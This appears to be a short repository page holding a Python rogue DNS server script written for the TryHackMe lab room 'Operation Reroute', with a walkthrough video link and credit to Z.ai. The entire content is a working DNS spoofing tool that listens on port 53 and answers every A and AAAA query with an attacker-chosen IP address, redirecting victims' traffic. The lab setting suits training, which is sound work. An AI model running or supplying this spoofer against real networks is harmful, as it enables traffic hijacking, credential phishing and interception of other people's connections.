
# script used on Tryhackme room Operation Reroute https://tryhackme.com/room/operationreroute
## YouTube video walk through: https://youtu.be/X-cy3A3nrSs
## script by Z.ai

```
cat > rogue_dns.py << 'EOF'
#!/usr/bin/env python3
# rogue_dns.py — usage: python3 rogue_dns.py [IP_TO_SPOOF_IN_ANSWERS]
import socket, struct, sys

SPOOF_IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"

def read_name(d, off):
    labels = []
    while True:
        n = d[off]
        if n == 0:            off += 1; break
        if n & 0xC0 == 0xC0:  off += 2; break
        labels.append(d[off+1:off+1+n].decode(errors="replace"))
        off += 1 + n
    return ".".join(labels), off

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("10.10.10.10", 53))   # fail here = you forgot the ip addr add
print(f"[+] rogue DNS on 10.10.10.10:53 — A/AAAA answers -> {SPOOF_IP}")
while True:
    data, addr = s.recvfrom(4096)
    try:
        qname, qend = read_name(data, 12)
        qtype, = struct.unpack("!H", data[qend:qend+2])
        print(f"[Q] {addr[0]} asks: {qname} (type {qtype})", flush=True)
        counts = struct.pack("!HHHH", 1, 1, 0, 0)
        ans = b""
        if qtype == 1:      # A
            ans = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 10, 4) + socket.inet_aton(SPOOF_IP)
        elif qtype == 28:   # AAAA
            ans = b"\xc0\x0c" + struct.pack("!HHIH", 28, 1, 10, 16) + b"\x00"*12 + socket.inet_aton(SPOOF_IP)
        else:               # TXT/MX/etc -> NOERROR, no answer (won't break stubs)
            counts = struct.pack("!HHHH", 1, 0, 0, 0)
        question = data[12:qend+4]
        s.sendto(data[:2] + struct.pack("!H", 0x8180) + counts + question + ans, addr)
    except Exception as e:
        print("err:", e, flush=True)
EOF
```
